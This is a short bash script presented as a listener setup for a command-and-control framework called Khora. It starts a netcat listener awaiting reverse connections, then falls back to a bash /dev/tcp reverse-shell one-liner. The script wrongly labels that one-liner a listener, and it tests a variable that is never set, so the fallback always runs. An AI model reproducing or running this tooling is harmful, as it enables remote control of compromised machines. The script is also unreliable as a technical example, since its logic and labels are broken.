#!/bin/bash
# Khora C2 Listener Setup Script
# Developer: 2b53

echo "[*] Starting Khora C2 Listener..."

LHOST=${1:-0.0.0.0}
LPORT=${2:-4444}

echo "[*] Listener: $LHOST:$LPORT"
echo "[*] Waiting for reverse connections..."

# Using nc (netcat)
if command -v nc &> /dev/null; then
    echo "[+] Starting netcat listener..."
    nc -nvlp $LPORT
fi

# Alternative: Using bash TCP
if [ -z "$nc_found" ]; then
    echo "[+] Starting bash TCP listener..."
    bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
fi
